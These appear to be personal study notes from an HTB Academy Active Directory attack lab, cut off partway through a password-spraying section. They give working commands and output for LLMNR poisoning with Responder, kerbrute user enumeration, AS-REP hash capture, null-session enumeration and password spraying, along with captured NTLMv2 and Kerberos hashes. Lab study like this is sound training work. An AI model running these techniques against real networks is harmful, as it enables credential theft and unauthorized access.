# Introduction to Active Directory Enumeration & Attacks





## Sommaire

1. [Initial Enumeration](#initial-enumeration)
   - [Initial Enumeration of the Domain](#initial-enumeration-of-the-domain)
     
2. [Sniffing out a Foothold](#sniffing-out-a-foothold)
   - [LLMNR/NBT-NS Poisoning from Linux](#llmnr-nbt-ns-poisoning-from-linux)
     
3. [Sighting In, Hunting For A User](#sighting-in-hunting-for-a-user)
   - [Enumerating & Retrieving Password Policies](#enumerating-&-retrieving-password-policies)
   - [Password Spraying Making a Target User List](#password-spraying-making-a-target-user-list)
     
5. [Spray Responsibly](#spray-responsibly)
   - [Internal Password Spraying from Linux](#internal-password-spraying-from-linux)
   - [Internal Password Spraying from Windows](#internal-password-spraying-from-windows)
     
6. [Deeper Down the Rabbit Hole](#deeper-down-the-rabbit-hole)
   - Enumerating Security Controls
   - Credentialed Enumeration from Windows
   - Credentialed Enumeration from Linux
   - Living Off the Land
     
7. [Cooking with the Fire](#cooking-with-the-fire)
   - Kerberoasting from Linux
   - Kerberoasting from Windows
     
8. [An ACE in the Hole](#an-ace-in-the-hole)
   - ACL Abuse Primer
   - ACL Enumeration
   - ACL Abuse Tactics
   - DCSync
     
9. [Stacking The Deck](#stacking-the-deck)
   - Privileged Access
   - Kerberos "Double Hop" Problem
   - Bleeping Edge Vulnerabilities
   - Miscellaneous Misconfigurations
     
10. Why So Trusting ?
    - Domain Trust Primer
    - Attacking Domain Trusts - Child -> Parent Trusts - from Windows
    - Attacking Domain Trusts - Child -> Parent Trusts - from Linux
      
11. Breaking Down Boundaries
    - Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows
    - Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux
      
12. Defensive Considerations
    - Hardening Active Directory
    - Additional AD Auditing Techniques
      
13. Skill Assessment - Final Showdown
    - AD Enumeration & Attacks - Skills Assessment Part I
    - AD Enumeration & Attacks - Skills Assessment Part II
    - Beyond this Module
   


## TOOLS

| Outil | Description |
|-------|-------------|
| [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) | A PowerShell tool and a .NET port of the same used to gain situational awareness in AD. These tools can be used as replacements for various Windows net* commands and more. PowerView and SharpView can help us gather much of the data that BloodHound does, but it requires more work to make meaningful relationships among all of the data points. These tools are great for checking what additional access we may have with a new set of credentials, targeting specific users or computers, or finding some "quick wins" such as users that can be attacked via Kerberoasting or ASREPRoasting. |
| [SharpView](https://github.com/dmchell/SharpView) | A PowerShell tool and a .NET port of the same used to gain situational awareness in AD. These tools can be used as replacements for various Windows net* commands and more. PowerView and SharpView can help us gather much of the data that BloodHound does, but it requires more work to make meaningful relationships among all of the data points. These tools are great for checking what additional access we may have with a new set of credentials, targeting specific users or computers, or finding some "quick wins" such as users that can be attacked via Kerberoasting or ASREPRoasting. |
| [BloodHound](https://github.com/BloodHoundAD/BloodHound) | Used to visually map out AD relationships and help plan attack paths that may otherwise go unnoticed. Uses the SharpHound PowerShell or C# ingestor to gather data to later be imported into the BloodHound JavaScript (Electron) application with a Neo4j database for graphical analysis of the AD environment. |
| [SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) | The C# data collector to gather information from Active Directory about varying AD objects such as users, groups, computers, ACLs, GPOs, user and computer attributes, user sessions, and more. The tool produces JSON files which can then be ingested into the BloodHound GUI tool for analysis. |
| [BloodHound.py](https://github.com/fox-it/BloodHound.py) | A Python-based BloodHound ingestor based on the Impacket toolkit. It supports most BloodHound collection methods and can be run from a non-domain joined attack host. The output can be ingested into the BloodHound GUI for analysis. |
| [Kerbrute](https://github.com/ropnop/kerbrute) | A tool written in Go that uses Kerberos Pre-Authentication to enumerate Active Directory accounts, perform password spraying, and brute-forcing. |
| [Impacket toolkit](https://github.com/SecureAuthCorp/impacket) | A collection of tools written in Python for interacting with network protocols. The suite of tools contains various scripts for enumerating and attacking Active Directory. |
| [Responder](https://github.com/lgandx/Responder) | Responder is a purpose-built tool to poison LLMNR, NBT-NS, and MDNS, with many different functions. |
| [Inveigh.ps1](https://github.com/Kevin-Robertson/Inveigh/blob/master/Inveigh.ps1) | Similar to Responder, a PowerShell tool for performing various network spoofing and poisoning attacks. |
| [C# Inveigh (InveighZero)](https://github.com/Kevin-Robertson/Inveigh/tree/master/Inveigh) | The C# version of Inveigh with a semi-interactive console for interacting with captured data such as username and password hashes. |
| [rpcinfo](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/rpcinfo) | The rpcinfo utility is used to query the status of an RPC program or enumerate the list of available RPC services on a remote host. The "-p" option is used to specify the target host. For example the command "rpcinfo -p 10.0.0.1" will return a list of all the RPC services available on the remote host, along with their program number, version number, and protocol. Note that this command must be run with sufficient privileges. |
| [rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) | A part of the Samba suite on Linux distributions that can be used to perform a variety of Active Directory enumeration tasks via the remote RPC service. |
| [CrackMapExec (CME)](https://github.com/byt3bl33d3r/CrackMapExec) | CME is an enumeration, attack, and post-exploitation toolkit which can help us greatly in enumeration and performing attacks with the data we gather. CME attempts to "live off the land" and abuse built-in AD features and protocols like SMB, WMI, WinRM, and MSSQL. |
| [Rubeus](https://github.com/GhostPack/Rubeus) | Rubeus is a C# tool built for Kerberos Abuse. |
| [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) | Another Impacket module geared towards finding Service Principal names tied to normal users. |
| [Hashcat](https://hashcat.net/hashcat/) | A great hash cracking and password recovery tool. |
| [enum4linux](https://github.com/CiscoCXSecurity/enum4linux) | A tool for enumerating information from Windows and Samba systems. |
| [enum4linux-ng](https://github.com/cddmp/enum4linux-ng) | A rework of the original Enum4linux tool that works a bit differently. |
| [ldapsearch](https://linux.die.net/man/1/ldapsearch) | Built-in interface for interacting with the LDAP protocol. |
| [windapsearch](https://github.com/ropnop/windapsearch) | A Python script used to enumerate AD users, groups, and computers using LDAP queries. Useful for automating custom LDAP queries. |
| [DomainPasswordSpray.ps1](https://github.com/dafthack/DomainPasswordSpray) | DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of a domain. |
| [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) | The toolkit includes functions written in PowerShell that leverage PowerView to audit and attack Active Directory environments that have deployed Microsoft's Local Administrator Password Solution (LAPS). |
| [smbmap](https://github.com/ShawnDEvans/smbmap) | SMB share enumeration across a domain. |
| [psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) | Part of the Impacket toolkit, it provides us with Psexec-like functionality in the form of a semi-interactive shell. |
| [wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py) | Part of the Impacket toolkit, it provides the capability of command execution over WMI. |
| [Snaffler](https://github.com/SnaffCon/Snaffler) | Useful for finding information (such as credentials) in Active Directory on computers with accessible file shares. |
| [smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) | Simple SMB server execution for interaction with Windows hosts. Easy way to transfer files within a network. |
| [setspn.exe](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)) | Adds, reads, modifies and deletes the Service Principal Names (SPN) directory property for an Active Directory service account. |
| [Mimikatz](https://github.com/ParrotSec/mimikatz) | Performs many functions. Notably, pass-the-hash attacks, extracting plaintext passwords, and Kerberos ticket extraction from memory on a host. |
| [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) | Remotely dump SAM and LSA secrets from a host. |
| [evil-winrm](https://github.com/Hackplayers/evil-winrm) | Provides us with an interactive shell on a host over the WinRM protocol. |
| [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py) | Part of the Impacket toolkit, it provides the ability to interact with MSSQL databases. |
| [noPac.py](https://github.com/Ridter/noPac) | Exploit combo using CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user. |
| [rpcdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/rpcdump.py) | Part of the Impacket toolset, RPC endpoint mapper. |
| [CVE-2021-1675.py](https://github.com/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py) | Printnightmare PoC in Python. |
| [ntlmrelayx.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) | Part of the Impacket toolset, it performs SMB relay attacks. |
| [PetitPotam.py](https://github.com/topotam/PetitPotam) | PoC tool for CVE-2021-36942 to coerce Windows hosts to authenticate to other machines via MS-EFSRPC EfsRpcOpenFileRaw or other functions. |
| [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py) | Tool for manipulating certificates and TGTs. |
| [getnthash.py](https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py) | This tool will use an existing TGT to request a PAC for the current user using U2U. |
| [adidnsdump](https://github.com/dirkjanm/adidnsdump) | A tool for enumerating and dumping DNS records from a domain. Similar to performing a DNS Zone transfer. |
| [gpp-decrypt](https://github.com/t0thkr1s/gpp-decrypt) | Extracts usernames and passwords from Group Policy preferences files. |
| [GetNPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) | Part of the Impacket toolkit. Used to perform the ASREPRoasting attack to list and obtain AS-REP hashes for users with the 'Do not require Kerberos preauthentication' set. These hashes are then fed into a tool such as Hashcat for attempts at offline password cracking. |
| [lookupsid.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py) | SID bruteforcing tool. |
| [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py) | A tool for creation and customization of TGT/TGS tickets. It can be used for Golden Ticket creation, child to parent trust attacks, etc. |
| [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py) | Part of the Impacket toolkit, it is a tool for automated child to parent domain privilege escalation. |
| [Active Directory Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer) | Active Directory Explorer (AD Explorer) is an AD viewer and editor. It can be used to navigate an AD database and view object properties and attributes. It can also be used to save a snapshot of an AD database for offline analysis. When an AD snapshot is loaded, it can be explored as a live version of the database. It can also be used to compare two AD database snapshots to see changes in objects, attributes, and security permissions. |
| [PingCastle](https://www.pingcastle.com/documentation/) | Used for auditing the security level of an AD environment based on a risk assessment and maturity framework (based on CMMI adapted to AD security). |
| [Group3r](https://github.com/Group3r/Group3r) | Group3r is useful for auditing and finding security misconfigurations in AD Group Policy Objects (GPO). |
| [ADRecon](https://github.com/adrecon/ADRecon) | A tool used to extract various data from a target AD environment. The data can be output in Microsoft Excel format with summary views and analysis to assist with analysis and paint a picture of the environment's overall security state. |


## Initial Enumeration

### Initial Enumeration of the Domain

Cette commande capture et affiche les paquets réseau sur l’interface ens224
```bash
keylian zergainoh@htb[/htb]$ sudo tcpdump -i ens224 
```


Lance l’outil Responder sur l’interface ens224 en mode analyse.
```bash
sudo responder -I ens224 -A
```


 Envoie des paquets ICMP à tous les hôtes dans le sous-réseau 172.16.5.0/23 pour déterminer lesquels sont actifs.
```bash
keylian zergainoh@htb[/htb]$ fping -asgq 172.16.5.0/23

172.16.5.5
172.16.5.25
172.16.5.50
172.16.5.100
172.16.5.125
172.16.5.200
172.16.5.225
172.16.5.238
172.16.5.240

     510 targets
       9 alive
     501 unreachable
       0 unknown addresses

    2004 timeouts (waiting for response)
    2013 ICMP Echos sent
       9 ICMP Echo Replies received
    2004 other ICMP received

 0.029 ms (min round trip time)
 0.396 ms (avg round trip time)
 0.799 ms (max round trip time)
       15.366 sec (elapsed real time)
```


Déplace l’exécutable kerbrute vers le répertoire /usr/local/bin pour le rendre accessible globalement.
Utilise kerbrute pour énumérer les utilisateurs dans le domaine INLANEFREIGHT.LOCAL en utilisant le contrôleur de domaine 172.16.5.5 et enregistre les utilisateurs valides dans le fichier valid_ad_users.

```bash
sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users

2021/11/17 23:01:46 >  Using KDC(s):
2021/11/17 23:01:46 >   172.16.5.5:88
2021/11/17 23:01:46 >  [+] VALID USERNAME:       jjones@INLANEFREIGHT.LOCAL
2021/11/17 23:01:46 >  [+] VALID USERNAME:       sbrown@INLANEFREIGHT.LOCAL
2021/11/17 23:01:46 >  [+] VALID USERNAME:       tjohnson@INLANEFREIGHT.LOCAL
2021/11/17 23:01:50 >  [+] VALID USERNAME:       evalentin@INLANEFREIGHT.LOCAL

 <SNIP>
 
2021/11/17 23:01:51 >  [+] VALID USERNAME:       sgage@INLANEFREIGHT.LOCAL
2021/11/17 23:01:51 >  [+] VALID USERNAME:       jshay@INLANEFREIGHT.LOCAL
2021/11/17 23:01:51 >  [+] VALID USERNAME:       jhermann@INLANEFREIGHT.LOCAL
2021/11/17 23:01:51 >  [+] VALID USERNAME:       whouse@INLANEFREIGHT.LOCAL
2021/11/17 23:01:51 >  [+] VALID USERNAME:       emercer@INLANEFREIGHT.LOCAL
2021/11/17 23:01:52 >  [+] VALID USERNAME:       wshepherd@INLANEFREIGHT.LOCAL
2021/11/17 23:01:56 >  Done! Tested 48705 usernames (56 valid) in 9.940 seconds

```
## Sniffing out a Foothold

### LLMNR NBT NS Poisoning from Linux
```bash
ifconfig                                                                                                                                                            
docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:30:d9:b2:11  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.225.134  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 fe80::f6ff:1908:eacf:8269  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef::e79b:94bf:10e9:62b1  prefixlen 64  scopeid 0x0<global>
        ether 00:50:56:94:cb:1b  txqueuelen 1000  (Ethernet)
        RX packets 2109  bytes 249773 (243.9 KiB)
        RX errors 0  dropped 100  overruns 0  frame 0
        TX packets 796  bytes 112882 (110.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens224: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.5.225  netmask 255.255.254.0  broadcast 172.16.5.255
        inet6 fe80::32e6:baa0:e3aa:25da  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:94:f6:d6  txqueuelen 1000  (Ethernet)
        RX packets 66800  bytes 4451108 (4.2 MiB)
        RX errors 0  dropped 15  overruns 0  frame 0
        TX packets 58933  bytes 4354434 (4.1 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
sudo responder -I ens224
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [ens224]
    Responder IP               [172.16.5.225]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-6UNMJVF6525]
    Responder Domain Name      [IRTA.LOCAL]
    Responder DCE-RPC Port     [48360]
[!] Error starting TCP server on port 3389, check permissions or other servers running.

[+] Listening for events...                                                                                                                                               

[*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
[*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
[*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
[*] [NBT-NS] Poisoned answer sent to 172.16.5.130 for name ACADEMY-EA-WEB0 (service: Workstation/Redirector)
[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
[*] [NBT-NS] Poisoned answer sent to 172.16.5.130 for name ACADEMY-EA-WEB0 (service: Workstation/Redirector)
[*] [NBT-NS] Poisoned answer sent to 172.16.5.130 for name ACADEMY-EA-WEB0 (service: Workstation/Redirector)
[*] [NBT-NS] Poisoned answer sent to 172.16.5.130 for name ACADEMY-EA-WEB0 (service: Workstation/Redirector)
[*] [NBT-NS] Poisoned answer sent to 172.16.5.130 for name ACADEMY-EA-WEB0 (service: Workstation/Redirector)
[*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
[*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
[*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
[*] [NBT-NS] Poisoned answer sent to 172.16.5.130 for name ACADEMY-EA-WEB0 (service: Workstation/Redirector)
[*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
[MSSQL] NTLMv2 Client   : 172.16.5.130
[MSSQL] NTLMv2 Username : INLANEFREIGHT\lab_adm
[MSSQL] NTLMv2 Hash     : lab_adm::INLANEFREIGHT:4aefe98c2befd788:193DEA5E4A4EB9F41ABC813C57F52A52:0101000000000000ABEE2646896DDB0186215D3ADAB2B6560000000002000800490052005400410001001E00570049004E002D00360055004E004D004A005600460036003500320035000400140049005200540041002E004C004F00430041004C0003003400570049004E002D00360055004E004D004A005600460036003500320035002E0049005200540041002E004C004F00430041004C000500140049005200540041002E004C004F00430041004C000800300030000000000000000000000000300000E3A522B26D265DC9C530A9F499332569AC2F333F2A78B1254A01CE6E5A29E9AB0A0010000000000000000000000000000000000009003A004D005300530051004C005300760063002F00610063006100640065006D0079002D00650061002D0077006500620030003A0031003400330033000000000000000000 
........................................

```
## Sighting In Hunting For A User


### Enumerating & Retrieving Password Policies

 Utilise enum4linux pour énumérer les utilisateurs sur l’hôte 172.16.5.5 et filtre les résultats pour afficher uniquement les noms d’utilisateur.
```bash
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

```


Utilise rpcclient pour se connecter à l’hôte 172.16.5.5 sans authentification.
```bash
rpcclient -U "" -N 172.16.5.5

```


 Utilise crackmapexec pour énumérer les utilisateurs SMB sur l’hôte 172.16.5.5.
```bash
crackmapexec smb 172.16.5.5 --users
```


Utilise windapsearch pour interroger le contrôleur de domaine à l’adresse IP 172.16.5.5 sans authentification et énumérer les utilisateurs.
```bash
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
```


Utilise kerbrute pour énumérer les utilisateurs dans le domaine inlanefreight.local en utilisant le contrôleur de domaine 172.16.5.5 et le fichier de noms d’utilisateur jsmith.txt
```
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```


Utilise crackmapexec pour énumérer les utilisateurs SMB sur l’hôte 172.16.5.5 avec les identifiants htb-student et Academy_student_AD!
```
sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
```


 Utilise ldapsearch pour interroger le serveur LDAP à 172.16.5.5 et filtre les résultats pour afficher les noms de compte SAM.
```
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```
Utilisation de PowerView

```powershell
PS C:\htb> import-module .\PowerView.ps1
PS C:\htb> Get-DomainPolicy

Unicode        : @{Unicode=yes}
SystemAccess   : @{MinimumPasswordAge=1; MaximumPasswordAge=-1; MinimumPasswordLength=8; PasswordComplexity=1;
                 PasswordHistorySize=24; LockoutBadCount=5; ResetLockoutCount=30; LockoutDuration=30;
                 RequireLogonToChangePassword=0; ForceLogoffWhenHourExpire=0; ClearTextPassword=0;
                 LSAAnonymousNameLookup=0}
KerberosPolicy : @{MaxTicketAge=10; MaxRenewAge=7; MaxServiceAge=600; MaxClockSkew=5; TicketValidateClient=1}
Version        : @{signature="$CHICAGO$"; Revision=1}
RegistryValues : @{MACHINE\System\CurrentControlSet\Control\Lsa\NoLMHash=System.Object[]}
Path           : \\INLANEFREIGHT.LOCAL\sysvol\INLANEFREIGHT.LOCAL\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHI
                 NE\Microsoft\Windows NT\SecEdit\GptTmpl.inf
GPOName        : {31B2F340-016D-11D2-945F-00C04FB984F9}
GPODisplayName : Default Domain Policy

```

Utilise kerbrute pour énumérer les utilisateurs dans le domaine INLANEFREIGHT en utilisant le contrôleur de domaine INLANEFREIGHT.LOCAL et le fichier de noms d’utilisateur jsmith.txt.

```powershell
kerbrute userenum -d INLANEFREIGHT --dc INLANEFREIGHT.LOCAL jsmith.txt                                                         

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 01/23/25 - Ronnie Flathers @ropnop

2025/01/23 09:20:52 >  Using KDC(s):
2025/01/23 09:20:52 >   INLANEFREIGHT.LOCAL:88

2025/01/23 09:20:52 >  [+] VALID USERNAME:  jjones@INLANEFREIGHT
2025/01/23 09:20:52 >  [+] VALID USERNAME:  sbrown@INLANEFREIGHT
2025/01/23 09:20:52 >  [+] VALID USERNAME:  jwilson@INLANEFREIGHT
2025/01/23 09:20:52 >  [+] VALID USERNAME:  tjohnson@INLANEFREIGHT
2025/01/23 09:20:52 >  [+] VALID USERNAME:  bdavis@INLANEFREIGHT
2025/01/23 09:20:52 >  [+] VALID USERNAME:  njohnson@INLANEFREIGHT
2025/01/23 09:20:52 >  [+] VALID USERNAME:  asanchez@INLANEFREIGHT
2025/01/23 09:20:52 >  [+] VALID USERNAME:  dlewis@INLANEFREIGHT
2025/01/23 09:20:52 >  [+] VALID USERNAME:  ccruz@INLANEFREIGHT
2025/01/23 09:20:52 >  [+] mmorgan has no pre auth required. Dumping hash to crack offline:
$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:232d64acb8a1f491a6fd11513d0881c3$1eadf75b0e3e9e6a6618f056a759aea61af09da3bee3e07b0cd00c8b6c1602d20bef71dfacd85468aa32f60a4e27185023472f8b7367faa2c97adbb4c90bd6a413ec54917a62103bedd6049711716cec6a3363b1b6ab6c602aa0f429fbe7dfec1dfe0770c5d32bedff09ae139d64d9abb81b16b3b588b449d8f5d8a3e78556a8f14ccb841025f074ed49402414cb1834efef5fe21dfef361cd0f18946310aaa2c49c6090d54fe16f8afcf480dfe8416271bbee0cfbc03309b4539e2bf839e28d3841202751601c3ffb8616a1eb4acf42a07a69be3c6a15ddbf87bd9f5311100807ed61b84f385ea7d89c47bb0b35f5cd0f93d09c06b76bd2afb877a46c2ca983ba0fff17                                                                                     
2025/01/23 09:20:52 >  [+] VALID USERNAME:  mmorgan@INLANEFREIGHT
2025/01/23 09:20:52 >  [+] VALID USERNAME:  rramirez@INLANEFREIGHT
2025/01/23 09:20:52 >  [+] VALID USERNAME:  jwallace@INLANEFREIGHT
2025/01/23 09:20:52 >  [+] VALID USERNAME:  jsantiago@INLANEFREIGHT
2025/01/23 09:20:52 >  [+] VALID USERNAME:  gdavis@INLANEFREIGHT
2025/01/23 09:20:52 >  [+] VALID USERNAME:  mrichardson@INLANEFREIGHT
2025/01/23 09:20:52 >  [+] VALID USERNAME:  mharrison@INLANEFREIGHT
2025/01/23 09:20:52 >  [+] VALID USERNAME:  tgarcia@INLANEFREIGHT
2025/01/23 09:20:52 >  [+] VALID USERNAME:  jmay@INLANEFREIGHT
2025/01/23 09:20:53 >  [+] VALID USERNAME:  jmontgomery@INLANEFREIGHT
2025/01/23 09:20:53 >  [+] VALID USERNAME:  jhopkins@INLANEFREIGHT
2025/01/23 09:20:53 >  [+] VALID USERNAME:  dpayne@INLANEFREIGHT
2025/01/23 09:20:53 >  [+] VALID USERNAME:  mhicks@INLANEFREIGHT
2025/01/23 09:20:53 >  [+] VALID USERNAME:  adunn@INLANEFREIGHT
2025/01/23 09:20:53 >  [+] VALID USERNAME:  lmatthews@INLANEFREIGHT
2025/01/23 09:20:53 >  [+] VALID USERNAME:  avazquez@INLANEFREIGHT
2025/01/23 09:20:53 >  [+] VALID USERNAME:  mlowe@INLANEFREIGHT
2025/01/23 09:20:53 >  [+] VALID USERNAME:  jmcdaniel@INLANEFREIGHT
2025/01/23 09:20:53 >  [+] VALID USERNAME:  csteele@INLANEFREIGHT
2025/01/23 09:20:53 >  [+] VALID USERNAME:  mmullins@INLANEFREIGHT
2025/01/23 09:20:54 >  [+] VALID USERNAME:  mochoa@INLANEFREIGHT
2025/01/23 09:20:54 >  [+] VALID USERNAME:  aslater@INLANEFREIGHT
2025/01/23 09:20:54 >  [+] VALID USERNAME:  ehoffman@INLANEFREIGHT
2025/01/23 09:20:54 >  [+] VALID USERNAME:  ehamilton@INLANEFREIGHT
2025/01/23 09:20:54 >  [+] VALID USERNAME:  cpennington@INLANEFREIGHT
2025/01/23 09:20:55 >  [+] VALID USERNAME:  srosario@INLANEFREIGHT
2025/01/23 09:20:55 >  [+] VALID USERNAME:  lbradford@INLANEFREIGHT
2025/01/23 09:20:55 >  [+] VALID USERNAME:  halvarez@INLANEFREIGHT
2025/01/23 09:20:55 >  [+] VALID USERNAME:  gmccarthy@INLANEFREIGHT
2025/01/23 09:20:55 >  [+] VALID USERNAME:  dbranch@INLANEFREIGHT
2025/01/23 09:20:55 >  [+] VALID USERNAME:  mshoemaker@INLANEFREIGHT
2025/01/23 09:20:56 >  [+] VALID USERNAME:  mholliday@INLANEFREIGHT
2025/01/23 09:20:56 >  [+] VALID USERNAME:  ngriffith@INLANEFREIGHT
2025/01/23 09:20:56 >  [+] VALID USERNAME:  sinman@INLANEFREIGHT
2025/01/23 09:20:56 >  [+] VALID USERNAME:  minman@INLANEFREIGHT
2025/01/23 09:20:56 >  [+] VALID USERNAME:  rhester@INLANEFREIGHT
2025/01/23 09:20:56 >  [+] VALID USERNAME:  rburrows@INLANEFREIGHT
2025/01/23 09:20:57 >  [+] VALID USERNAME:  dpalacios@INLANEFREIGHT
2025/01/23 09:20:58 >  [+] VALID USERNAME:  strent@INLANEFREIGHT
2025/01/23 09:20:58 >  [+] VALID USERNAME:  fanthony@INLANEFREIGHT
2025/01/23 09:20:59 >  [+] VALID USERNAME:  evalentin@INLANEFREIGHT
2025/01/23 09:20:59 >  [+] VALID USERNAME:  sgage@INLANEFREIGHT
2025/01/23 09:20:59 >  [+] VALID USERNAME:  jshay@INLANEFREIGHT
2025/01/23 09:21:00 >  [+] VALID USERNAME:  jhermann@INLANEFREIGHT
2025/01/23 09:21:01 >  [+] VALID USERNAME:  whouse@INLANEFREIGHT
2025/01/23 09:21:01 >  [+] VALID USERNAME:  emercer@INLANEFREIGHT
2025/01/23 09:21:02 >  [+] VALID USERNAME:  wshepherd@INLANEFREIGHT
2025/01/23 09:21:03 >  Done! Tested 48705 usernames (56 valid) in 11.225 seconds
```

## Spray Responsibly

### Internal Password Spraying from Linux

Une fois que nous avons créé une liste de mots en utilisant l’une des méthodes présentées dans la section précédente, il est temps d’exécuter l’attaque. Rpcclient est une excellente option pour effectuer cette attaque depuis Linux. Une considération importante est qu’une connexion valide n’est pas immédiatement apparente avec rpcclient, la réponse “Authority Name” indiquant une connexion réussie. Nous pouvons filtrer les tentatives de connexion invalides en recherchant “Authority” dans la réponse. La commande Bash suivante (adaptée d’ici) peut être utilisée pour effectuer l’attaque.

```bash
keylian zergainoh@htb[/htb]$ for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done

Account Name: tjohnson, Authority Name: INLANEFREIGHT
Account Name: sgage, Authority Name: INLANEFREIGHT
```

#### Using Kerbrute for the Attack

```bash
keylian zergainoh@htb[/htb]$ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnop

